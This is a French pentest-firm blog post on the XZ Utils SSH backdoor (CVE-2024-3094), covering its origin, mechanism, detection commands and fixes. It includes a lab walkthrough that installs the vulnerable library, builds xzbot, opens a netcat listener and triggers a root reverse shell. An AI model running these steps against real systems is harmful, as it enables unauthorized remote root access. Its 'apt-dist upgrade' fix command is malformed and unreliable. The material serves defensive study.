---
title: "XZ Utils : la backdoor faisant trembler le monde libre et de la cybersécurité"
description: "XZ Utils possède une backdoor importante dans sa dernière version 5.6.0 et 5.6.1. Son exploitation n'est cependant pas triviale."
date: 2024-04-01T10:21:17+01:00
draft: false
images: [/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/logo.png]
featuredImage: "/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/logo.png"
featuredImagePreview: "/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/logo.png"
tags: ["Test d'intrusion", "Pentest", "Audit"]
---

# 🕶️ Nouvelle et sulfureuse porte dérobée dans XZ Utils sur Linux

## Introduction

Le **29 mars 2024**, une faille de sécurité majeure a été découverte dans `XZ Utils`, un paquet largement utilisé dans les distributions Linux populaires. Cette faille, connue sous le nom de **CVE-2024-3094**, permet aux attaquants **d'exécuter du code à distance** sur les systèmes affectés.

## TL;DR

La **CVE-2024-3094** introduit un backdoor dans le serveur OpenSSH, permettant à des attaquants en possession d'une clef privée **UNIQUE** de lancer des commandes avant l'étape d'authentification.

- Cette porte dérobée **n'est pas utilisable** sans posséder la clef privée adéquat.
- La clef privée adéquat n'est pas **publique**.
- Elle permet d'exécuter des commandes en tant qu'utilisateur `root`.
- Un patch est **disponible**.

![XZ Utils](/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/1.png)

## L'origine

L'origine de cette faille provient d'un individu nommé **Jia Tan** ayant rejoint le projet XZ Utils en **2022**. Au fil du temps, il acquis la confiance des autres contributeurs et obtenu des permissions de plus en plus importantes, lui permettant de publier de **nouvelles versions du logiciel**.

C'est dans les versions `5.6.0` et `5.6.1` de `XZ Utils` que **Jia Tan** introduit une porte dérobée, un code malveillant capable de prendre le contrôle des systèmes affectés. Ce code, absent dans le dépôt public du projet, a été ajouté uniquement dans les versions compressées du code source téléchargeables par les utilisateurs sur GitHub.

Le fonctionnement de la porte dérobée est **très complexe** et repose sur plusieurs techniques pour échapper à la détection. Elle utilise notamment des fonctions spécifiques du **compilateur**, des **fichiers cachés** et des **scripts exécutés pendant la compilation** de la librairie `XZ Utils`.

🎯 Son objectif final est de remplacer une fonction de la librairie **SSH**, permettant aux attaquants de se connecter au système **sans authentification** et d'exécuter n'importe quelle commande.

## Détails techniques

La technicité de la porte dérobée est fascinante et utilise un système ingénieux pour contourner l'authentification :

1. Les fonctionnalités malveillantes se situent (dans les grandes lignes) dans le fichier `/usr/lib/liblzma.so.5.6.1`.
2. La charge détourne la fonction `RSA_public_decrypt` utilisé pour la vérification de signature.
3. Le code malveillant examine ensuite le module public `RSA` (modulo n) transmis dans la structure `RSA` (4e argument de `RSA_public_decrypt`). Cette valeur est communiquée par l'attaquant lors de l'authentification SSH.
4. La backdoor déchiffre et vérifie la signature via une clef publique ED448 (ci-dessous)
```
0a 31 fd 3b 2f 1f c6 92 92 68 32 52 c8 c1 ac 28
34 d1 f2 c9 75 c4 76 5e b1 f6 88 58 88 93 3e 48
10 0c b0 6c 3a be 14 ee 89 55 d2 45 00 c7 7f 6e
20 d3 2c 60 2b 2c 6d 31 00
```
5. Uniquement l'attaquant possède la clef privée liée à cette clef publique 
6. Si la signature est valide, la commande envoyée par l'attaquant est passé dans `system()` et exécutée en tant que `root`.

{{< admonition tips "Plus d'infos !" >}}
Si vous souhaitez plus de détails techniques, vous pouvez consulter l'excellent article de https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/
{{< /admonition >}}

## Exploitation

Du coup, la grande question ! Est-ce facilement exploitable ? La réponse est **NON**. 

### Détection

Pour commencer, vous pouvez utiliser la commande ci-dessous pour vérifier que vous soyez vulnérable :

```bash
strings `which xz` | grep '5\.6\.[01]'

XZ_5.6.0
xz (XZ Utils) 5.6.1
```

Ci-dessous une autre commande attestant de votre vulnérabilité :

```sh
strings `which xz` | grep '5\.6\.[01]'

xz (XZ Utils) 5.6.1
```

Dans un autre cas, une machine saine ne retournera rien.

```sh
strings `which xz` | grep '5\.6\.[01]'
```

### Pas à pas

L'exploitation n'est pas très complexe. Or, il faut garder en tête que son exploitation de masse n'est pas possible car **vous ne connaissez pas la clef privée de l'attaquant.**

Dans notre laboratoire, nous allons modifier la clef publique de l'attaquant par la notre afin de garantir la bonne signature.

Pour commencer, il est nécessaire d'installer la version vulnérable sur la machine à exploiter.

```bash
sudo apt remove xz-utils
wget https://snapshot.debian.org/archive/debian/20240328T025657Z/pool/main/x/xz-utils/liblzma5_5.6.1-1_amd64.deb
dpkg -i liblzma5_5.6.1-1_amd64.deb 
```

![alt text](/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo1.png)

Vérifiez que vous soyez bien vulnérable avec la commande :

```bash
xz -V                                

xz (XZ Utils) 5.6.1
liblzma 5.6.1
```

Localisez et modifiez la signature de la backdoor :

```bash
sudo find / -name "liblzma.so.5.6.1" 2> /dev/null

# /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1
                                                                                                                   
shasum -a 256 /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1

# 605861f833fc181c7cdcabd5577ddb8989bea332648a8f498b4eef89b8f85ad4  /usr/lib/x86_64-linux-gnu/liblzma.so.5.6.1
```

{{< admonition tips "Plus d'infos !" >}}
Si vous souhaitez de l'aide sur cette étape : https://github.com/amlweems/xzbot
{{< /admonition >}}

![alt text](/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo2.png)

![alt text](/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo3.png)

Activez le service `SSH` :

```sh
sudo systemctl start ssh
```

![alt text](/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo4.png)

Construisez le binaire du PoC et ouvrez un listener `netcat`.

```sh
go build .

# Autre terminal
nc -lvp 4444
```

![alt text](/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo5.png)

Déclenchez la backdoor avec la commande `xzbot -addr 127.0.0.1 -cmd '<command>'`. L'exemple ci-dessous permet de déclencher l'exécution d'un reverse shell.

![alt text](/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo6.png)

Enfin, certains articles parlent de la présence d'un KillSwitch via la variable d'environnement `yolAbejyiejuvnup=Evjtgvsh5okmkAvj`. Cela ne semble avoir aucun effet 🤔

![alt text](/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/demo7.png)


## Les risques 

🤔 Il y a t'il un risque pour ma société ?

**Oui mais assez faible !**

Comme vu dans l'article au dessus, il n'est pas possible d'utiliser la backdoor **sans posséder la clef privée**. Uniquement l'attaquant à l'origine de la backdoor est en mesure de l'utiliser. 

Or, à ce jour nous ne savons pas qui est l'acteur réel de ce code malveillant. Pas précaution, il est donc fortement conseillé de corriger ses instances

## Correction

La correction est assez simple. Il existe 2 solutions :
- Passer en version `5.6.1-r2`.
- Redescendre en version `5.4.6`.

Exemple générique de mise à jour sur un système `Debian` :

```sh
sudo apt update && sudo apt-dist upgrade -y
```

## Démo

Petite démonstration ci-dessous pour présenter l'exploitation de la vulnérabilité sur une machine vierge vulnérable.

<video src="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/exploit.mp4" controls autoplay loop title="Exploitation de la backdore XZ Utils" style="width:100%"></video>

## En conclusion

L'attaque par porte dérobée dans `XZ Utils` est un exemple frappant des dangers liés aux logiciels libres. La confiance accordée aux contributeurs est essentielle, mais elle ne doit pas empêcher la mise en place de mesures de sécurité pour prévenir ce genre d'incident.

Dans le cas de l'attaque `XZ Utils`, des tests d'intrusion réguliers auraient pu permettre de détecter la porte dérobée à un stade précoce.

- **Analyse du code source**: des auditeurs auraient pu analyser le code source de `XZ Utils` pour identifier des anomalies ou des vulnérabilités potentielles.
- **Tests d'intrusion**: des tests d'intrusions complets auraient pu être réalisés pour identifier d'autres failles de sécurité dans le système.

**Trackflaw** est en mesure de vous accompagner sur ces étapes cruciales, prenez contact avec nous ! 👋

## Sources 

- https://www.akamai.com/blog/security-research/critical-linux-backdoor-xz-utils-discovered-what-to-know
- https://jfrog.com/blog/xz-backdoor-attack-cve-2024-3094-all-you-need-to-know/
- https://github.com/amlweems/xzbot
- https://snapshot.debian.org/package/xz-utils/5.6.1-1/